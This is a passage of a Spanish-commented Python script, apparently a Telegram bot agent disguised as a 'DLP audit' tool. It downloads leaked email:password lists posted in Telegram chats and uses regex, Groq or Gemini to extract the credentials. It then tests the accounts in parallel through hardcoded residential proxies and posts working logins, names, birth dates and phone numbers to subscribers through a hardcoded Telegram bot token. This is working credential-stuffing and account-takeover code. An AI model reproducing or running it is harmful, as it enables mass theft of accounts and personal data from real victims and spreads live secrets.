            elif email_lower.endswith('.uy') or email_lower.endswith('.com.uy'): country = 'UY'
            elif email_lower.endswith('.br') or email_lower.endswith('.com.br'): country = 'BR'
            elif email_lower.endswith('.it'): country = 'IT'
            elif email_lower.endswith('.fr'): country = 'FR'
            elif email_lower.endswith('.de'): country = 'DE'
            elif email_lower.endswith('.uk') or email_lower.endswith('.co.uk'): country = 'UK'
            elif email_lower.endswith('.ca'): country = 'CA'
            elif email_lower.endswith('.nl') or email_lower.endswith('.no'): country = email_lower.split('.')[-1].upper()
            elif email_lower.endswith('.pt'): country = 'PT'
            else: country = 'US'

        # --- DISPATCH HIT POR USUARIO ---
        hit_global_data = {
            "email": email,
            "pass": password,
            "domain": "outlook.com",
            "match": keyword if keyword else "HOTMAIL HQ",
            "messages": subject_count,
            "country": country,
            "name": name,
            "dob": dob,
            "language": language,
            "phone": phone
        }
        
        token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"

        if not user_targets_dict:
            # Fallback for old mode or single user testing
            fallback_cid = os.environ.get("TELEGRAM_CHAT_ID", "1016773223")
            formatted_senders = ", ".join([f"{a} ({c})" for a, c in senders_found.items()]) if senders_found else "N/A"
            hit_data = hit_global_data.copy()
            hit_data["senders"] = formatted_senders
            hit_data["chat_id"] = fallback_cid
            if getattr(hits_buffer, 'append', None) is not None: hits_buffer.append(hit_data)
        else:
            # Multi-Tenant Dispatch Protocol
            for cid, u_senders in user_targets_dict.items():
                u_found = {}
                for found_addr, count in senders_found.items():
                    for target in u_senders:
                        if target in found_addr:
                            u_found[found_addr] = count
                            break
                            
                # Solo notificar al usuario si la cuenta SÍ tiene al menos un remitente de los suyos, 
                # Inform the user that the account works, even if they didn't specifically find their targets
                if not u_found and len(u_senders) > 0:
                    pass
                
                formatted_u_senders = ", ".join([f"{a} ({c})" for a, c in u_found.items()]) if u_found else "N/A"
                hit_data = hit_global_data.copy()
                hit_data["senders"] = formatted_u_senders
                hit_data["chat_id"] = str(cid)
                
                realtime_alert = (
                    f"📣 ¡OBJETIVO DETECTADO! (HIT) 🎯\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 Usuario: VPS Agent\n"
                    f"✅ Match: {hit_data['match']}\n"
                    f"📧 Correo: {email}\n"
                    f"🔑 Pass: {password}\n"
                    f"🌍 País: {country}\n\n"
                    f"👤 Nombre: {name}\n"
                    f"📅 DOB: {dob}\n"
                    f"🗣️ Idioma: {language}\n"
                    f"📱 Teléf: {phone}\n\n"
                    f"📊 Mensajes Relevantes: {sum(u_found.values()) if u_found else 0}\n"
                    f"🔍 Búsqueda: from:{', from:'.join(u_senders) if u_senders else 'N/A'}\n"
                    f"🤖 DLP Audit Pro System"
                )
                
                try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": str(cid), "text": realtime_alert})
                except: pass
                
                if getattr(hits_buffer, 'append', None) is not None:
                    hits_buffer.append(hit_data)

    except Exception as e:
        print(f"[DEBUG vps_agent] Local audit general error: {e}")
        pass

def process_file_and_scan(file_path, keyword=""):
    print("📥 Archivo detectado. Iniciando Auditoría DLP automática DESDE EL VPS...")
    hits_buffer = []
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            creds_text = f.read()
    except Exception as e:
        print(f"❌ Error leyendo archivo: {e}")
        return
        
    # Intento 1: Regex robusto local para no depender de la IA si la cuota falla
    valid_creds = []
    import re
    matches = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*(\S+)', creds_text)
    for email_match, pass_match in matches:
        valid_creds.append(f"{email_match.strip()}:{pass_match.strip()}")
        
    # Deduplicar
    valid_creds = list(dict.fromkeys(valid_creds))
            
    if not valid_creds:
        print("⚠️ Parser local estricto falló. Archivo demasiado sucio. Cayendo a Groq AI...")
        ai_creds = extract_with_groq(creds_text)
        
        if not ai_creds:
            print("🔄 Cayendo al Motor de Respaldo Definitivo (Gemini)...")
            ai_creds = extract_with_gemini(creds_text)
            
        if ai_creds:
            print(f"🧠 Motor AI logró rescatar {len(ai_creds)} objetivos válidos.")
            valid_creds = ai_creds
    
    if not valid_creds:
        print("❌ Error: No se encontraron credenciales válidas ni con el parser estándar ni con la IA.")
        return

    print(f"✅ Procesando {len(valid_creds)} objetivos de forma 100% aislada...")
    
    # ── CARGAR USUARIOS ACTIVOS DE RENDER DB ──
    users = []
    try:
        conn = get_remote_db_conn()
        if conn:
            cur = conn.cursor()
            cur.execute("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
            users = cur.fetchall()
            conn.close()
    except Exception as e:
        print(f"Error alerting start DB: {e}")

    if not users:
        fallback_cid = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        if fallback_cid:
            users = [(fallback_cid,)]

    try:
        token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
        for row in users:
            cid = row[0]
            msg = f"📥 *NUEVO ARCHIVO DETECTADO (VÍA VPS AGENT)*\nSe encontró un archivo con `{len(valid_creds)}` correos en ASTERA.\n\n⚡ _Iniciando Escáner DLP Turbo Local...\nTe notificaré los HITS cuando termine._"
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": cid, "text": msg, "parse_mode": "Markdown", "disable_web_page_preview": True})
    except Exception as e:
        print(f"Error alerting start telegram: {e}")

    # Cargar los remitentes objetivo desde la BD una sola vez
    target_senders_list = get_target_senders_from_db()
    
    def scan_cred_worker(cred):
        email, pwd = cred.split(':', 1)
        iproyal_auth = {
            "http": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321",
            "https": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321"
        }
        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer, keyword, user_targets_dict=target_senders_list)
        time.sleep(random.uniform(0.5, 1.2))

    # 🔥 TURBO MODE: 10 hilos en paralelo ejecutados localmente
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(scan_cred_worker, valid_creds)
            
    print(f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada en VPS.")

    if hits_buffer:
        print(f"📦 Enviando reporte consolidado de {len(hits_buffer)} HITs únicos a la red...")
        # Multiplicamos el HIT por todos los usuarios suscritos en DB
        final_hits_to_dispatch = []
        try:
            active_users = []
            conn = get_remote_db_conn()
            if conn:
                cur = conn.cursor()
                cur.execute("SELECT telegram_chat_id, is_superadmin FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != ''")
                active_users = cur.fetchall()
                conn.close()
            
            if not active_users:
                fallback_cid = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
                if fallback_cid:
                    active_users = [(fallback_cid, 1)]

            super_admins = []
            for row in active_users:
                cid = row[0]
                is_admin = row[1] if len(row) > 1 and row[1] is not None else 0
                if is_admin == 1: 
                    super_admins.append(cid)
                    
            # Los HITS ya vienen con el chat_id mapeado desde run_local_audit! Send_consolidated ya sabe qué mandarle a quién.
            send_consolidated_report(hits_buffer)
            
            if super_admins:
                print("🧠 Generando Reporte de Salud (Llama-3) para Súper Administrador...")
                summary_text = generate_exec_summary(len(creds_text.split('\n')), len(valid_creds), hits_buffer)
                token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
                for s_cid in super_admins:
                    try:
                        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                            json={"chat_id": s_cid, "text": f"🧠 *REPORTE DE INTELIGENCIA (GROQ AI)*\n\n{summary_text}", "parse_mode": "Markdown"})
                    except Exception as e: 
                        print(f"Error enviando reporte AI: {e}")
                        
        except Exception as e:
            print(f"❌ Error despachando Hits a usuarios: {e}")
    else:
        print("✅ No se encontraron HITs en este lote.")

def send_consolidated_report(hits):
    user_hits = {}
    for h in hits:
        cid = h['chat_id']
        if cid not in user_hits: user_hits[cid] = []
        user_hits[cid].append(h)
    
    token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"

    for cid, u_hits in user_hits.items():
        categories = {}
        for h in u_hits:
            cat = h['match']
            if cat not in categories: categories[cat] = []
            categories[cat].append(h)
        
        summary_lines = ["📊 *REPORTE DE AUDITORÍA DLP (AGENT VPS)* 📊", "━━━━━━━━━━━━━━━━━"]
        for cat, items in categories.items():
            summary_lines.append(f"✅ *{cat}*: `{len(items)}` aciertos")
        summary_lines.append("\n📄 _Detalles completos en el archivo adjunto_")

        report_name = f"reporte_hits_{cid}_{int(time.time())}.txt"
        report_path = os.path.join("incoming_targets", report_name)
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write("DLP AUDIT PRO - REPORTE VPS\n")
            f.write("="*40 + "\n\n")
            for cat, items in categories.items():
                f.write(f"📁 CARPETA / OBJETIVO MATCH: {cat}\n")
                f.write(f"▼ {len(items)} CUENTAS RECUPERADAS ▼\n")
                f.write("-" * 50 + "\n")
                for h in items:
                    f.write(f"EMAIL: {h['email']} | PASS: {h['pass']}\n")
                    f.write(f"PAIS: {h['country']} | NOMBRE: {h.get('name', 'N/A')}\n")
                    f.write(f"DOB: {h.get('dob', 'N/A')} | TELEFONO: {h.get('phone', 'N/A')}\n")
                    senders = h.get('senders', 'N/A')
                    msgs = h.get('messages', 'N/A')
                    f.write(f"📧 REMITENTES OBJETIVO ({msgs} emails encontrados):\n")
                    if senders != 'N/A':
                        for s_entry in senders.split(", "):
                            f.write(f"   → {s_entry}\n")
                    else:
                        f.write(f"   → Ninguno encontrado en inbox\n")
                    f.write("-" * 50 + "\n")
                f.write("\n\n")

        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": cid, "text": "\n".join(summary_lines), "parse_mode": "Markdown"})
            with open(report_path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{token}/sendDocument",
                              data={"chat_id": cid}, files={"document": f})
        except Exception as e:
            print(f"Error enviando reporte bot para {cid}: {e}")

# =======================================================
# TELEGRAM LISTENER (Local Event Loop)
# =======================================================
FILTER_KEYWORD = os.environ.get("FILTER_KEYWORD", "HOTMAIL HQ")

@client.on(events.NewMessage)
async def handler(event):
    if event.message.document:
        doc = event.message.document
        mime = doc.mime_type
        file_name = ""
        for attr in doc.attributes:
            if hasattr(attr, 'file_name'):
                file_name = attr.file_name
                break
                
        print(f"\n[DEBUG] Documento detectado. Nombre: '{file_name}', Mime: '{mime}'")
        
        if file_name and file_name.startswith("reporte_hits_"):
            return
                
        if mime == 'text/plain' or file_name.lower().endswith('.txt'):
            msg_text = getattr(event.message, 'message', '') or ''
            has_keyword = False
            if FILTER_KEYWORD:
                has_keyword = (FILTER_KEYWORD.lower() in file_name.lower()) or (FILTER_KEYWORD.lower() in msg_text.lower())
                
            if FILTER_KEYWORD and not has_keyword:
                print(f"[DEBUG] -> Ignorado: No contiene la palabra clave '{FILTER_KEYWORD}'.")
                return
                
            chat = await event.get_chat()
            try:
                chat_title = getattr(chat, 'title', getattr(chat, 'username', str(chat.id)))
            except:
                chat_title = "Chat Privado"
                
            print(f"\n[*] ¡Documento .txt ('{file_name}') detectado en: {chat_title}!")
            try:
                local_path = os.path.join(DOWNLOAD_DIR, f"{int(time.time())}_{file_name if file_name else 'lista.txt'}")
                print(f"    -> Descargando a Windows VPS...")
                await client.download_media(event.message, file=local_path)
                print(f"    -> Iniciando Escáner DLP Aislado...")
                
                search_term = msg_text if msg_text else FILTER_KEYWORD
                t = threading.Thread(target=process_file_and_scan, args=(local_path, search_term))
                t.start()
            except Exception as e:
                print(f"Error descargando medio: {e}")

def main():
    print("══════════════════════════════════════════════════")
    print("  🖥️  VPS WINDOWS: AGENTE DLP INDEPENDIENTE       ")
    print("══════════════════════════════════════════════════")
    
    print(f"\n📡 Escuchando TODO TELEGRAM 24/7 de forma independiente...")
    if FILTER_KEYWORD:
        print(f"🔍 FILTRO ACTIVO: Solo procesará archivos .txt si su nombre o comentario contiene '{FILTER_KEYWORD}'")
    
    client.start()
    client.run_until_disconnected()

if __name__ == '__main__':
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("\nSaliendo del Agente VPS...")
            break
        except Exception as e:
            print(f"\n❌ Error fatal o agente desconectado: {e}")
            print("⏳ Reintentando conexión en 15 segundos para mantener el VPS en línea...")
            time.sleep(15)
